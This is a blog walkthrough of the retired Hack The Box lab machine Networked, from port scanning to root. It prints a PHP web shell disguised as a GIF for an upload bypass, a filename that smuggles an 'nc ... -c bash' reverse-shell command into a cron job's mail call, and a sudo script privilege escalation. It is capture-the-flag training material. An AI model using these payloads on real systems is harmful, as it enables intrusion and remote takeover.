---
layout: post
title: "Networked: Hack The Box Walkthrough"
date: 2019-11-17 06:42:44 +0000
last_modified_at: 2019-11-17 06:42:44 +0000
category: Walkthrough
tags: ["Hack The Box", Networked, retired]
comments: true
image:
  feature: networked-htb-walkthrough.jpg
  credit: geralt / Pixabay
  creditlink: https://pixabay.com/illustrations/network-social-abstract-3139214/
---

This post documents the complete walkthrough of Networked, a retired vulnerable [VM][1] created by [guly][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Networked is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.146 --rate=500

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-08-25 09:31:50 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 80/tcp on 10.10.10.146                                    
Discovered open port 22/tcp on 10.10.10.146
```

Nothing unsual with the open ports. Let\'s do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p22,80 -A --reason -oN nmap.txt 10.10.10.146
...
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
```

Looks like we have only the `http` service to explore. Here's what it looks like.

<a class="image-popup">
![7759278b.png](/assets/images/posts/networked-htb-walkthrough/7759278b.png)
</a>

I\'ve no idea what it means. Well, moving on to the next step.

### Directory/File Enumeration

Let's kick things off with `wfuzz` and SecLists.

```
# wfuzz -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc '403,404' http://10.10.10.146/FUZZ
********************************************************
* Wfuzz 2.2.1 - The Web Fuzzer                           *
********************************************************

Target: HTTP://10.10.10.146/FUZZ
Total requests: 4594

==================================================================
ID      Response   Lines      Word         Chars          Request    
==================================================================

00702:  C=301      7 L        20 W          235 Ch        "backup"
02095:  C=200      8 L        40 W          229 Ch        "index.php"
04196:  C=301      7 L        20 W          236 Ch        "uploads"

Total time: 93.26074
Processed Requests: 4594
Filtered Requests: 4591
Requests/sec.: 49.25974
```

The directory `/backup` sure looks interesting.

<a class="image-popup">
![665e6cf9.png](/assets/images/posts/networked-htb-walkthrough/665e6cf9.png)
</a>

Let\'s download it and see what\'s inside.

<a class="image-popup">
![d50974c8.png](/assets/images/posts/networked-htb-walkthrough/d50974c8.png)
</a>

Looks like the backup of the PHP files present in the site. If the acutal `upload.php` is identical to that of the backup, then there's a vulnerability with the upload form.

<div class="filename"><span>upload.php</span></div>

```php
// $name = $_SERVER['REMOTE_ADDR'].'-'. $myFile["name"];
list ($foo,$ext) = getnameUpload($myFile["name"]);
$validext = array('.jpg', '.png', '.gif', '.jpeg');
$valid = false;
foreach ($validext as $vext) {
  if (substr_compare($myFile["name"], $vext, -strlen($vext)) === 0) {
    $valid = true;
  }
}
```

<div class="filename"><span>lib.php</span></div>

```php
function getnameUpload($filename) {
  $pieces = explode('.',$filename);
  $name= array_shift($pieces);
  $name = str_replace('_','.',$name);
  $ext = implode('.',$pieces);
  return array($name,$ext);
}
```

As long as the extension ends with one of extensions, we should be able to upload a PHP file with double extension, e.g. `cmd.php.gif`. Here's what `cmd.php.gif` looks like.

<div class="filename"><span>cmd.php.gif</span></div>

```php
GIF89a
<pre><?php echo shell_exec($_GET[0]); ?></pre>
```

Let\'s give it a shot.

```
# curl -F "myFile=@cmd.php.gif;type=image/gif" -F "submit=go" http://10.10.10.146/upload.php
<p>file uploaded, refresh gallery</p>
```

<a class="image-popup">
![65789937.png](/assets/images/posts/networked-htb-walkthrough/65789937.png)
</a>

Awesome. It got uploaded.

<a class="image-popup">
![844b4736.png](/assets/images/posts/networked-htb-walkthrough/844b4736.png)
</a>

And we got remote code execution!

## Low-Privilege Shell

The creator was kind to leave `ncat` installed. We can simply use that to give us a reverse shell.

<a class="image-popup">
![77c4e58d.png](/assets/images/posts/networked-htb-walkthrough/77c4e58d.png)
</a>

On my `nc` listener, a reverse shell comes knocking.

<a class="image-popup">
![3ccf4fda.png](/assets/images/posts/networked-htb-walkthrough/3ccf4fda.png)
</a>

## Privilege Escalation

During enumeration of `guly`'s home directory, I noticed two interesting files, `crontab.guly` and `check_attack.php`.

<div class="filename"><span>crontab.guly</span></div>

```
*/3 * * * * php /home/guly/check_attack.php
```

<div class="filename"><span>check_attack.php</span></div>

~~~~php
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
        $msg='';
  if ($value == 'index.html') {
        continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}

?>
~~~~

If the files were to be believed, then a `cron` job will check and report to `guly` with `mail($to, $msg, $msg, $headers, "-F$value");` at every three minutes, for files in `/var/www/html/uploads` that doesn't begin with an IP address. This is easy to exploit. We can simply `touch` a file with a file name that begins with `;` to separate `sendmail` from the command that we want to execute.

```
$ touch ';nc 10.10.12.161 4321 -c bash'
```

Three minutes later, a reverse shell as `guly` appears in my `nc` listener.

<a class="image-popup">
![a23e4e9b.png](/assets/images/posts/networked-htb-walkthrough/a23e4e9b.png)
</a>

Let\'s [upgrade](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) our shell to full TTY.

The file `user.txt` is at `guly`'s home directory.

<a class="image-popup">
![94e11c09.png](/assets/images/posts/networked-htb-walkthrough/94e11c09.png)
</a>

### Getting `root.txt`

During enumeration of guly\'s account, I notice `guly` is able to run the following command as `root` without password.

<a class="image-popup">
![f1268379.png](/assets/images/posts/networked-htb-walkthrough/f1268379.png)
</a>

Check out the code in the script.

~~~~bash
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
        echo "interface $var:"
        read x
        while [[ ! $x =~ $regexp ]]; do
                echo "wrong input, try again"
                echo "interface $var:"
                read x
        done
        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done

/sbin/ifup guly0
~~~~

Firstly, all the network scripts are written in `bash`. Furthermore, the single space character is allowed in the regular expression. Space is recognized as one of internal field separators (or IFS), which in this case really plays to our advantage, as you shall see.

<a class="image-popup">
![276eb6e4.png](/assets/images/posts/networked-htb-walkthrough/276eb6e4.png)
</a>

Any of the variables can be used to execute a command in the second field separated by a single space.

<a class="image-popup">
![001c116e.png](/assets/images/posts/networked-htb-walkthrough/001c116e.png)
</a>

Getting `root.txt` with a `root` shell is trivial.

<a class="image-popup">
![3f8f640f.png](/assets/images/posts/networked-htb-walkthrough/3f8f640f.png)
</a>

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/203
[2]: https://www.hackthebox.eu/home/users/profile/8292
[3]: https://www.hackthebox.eu/
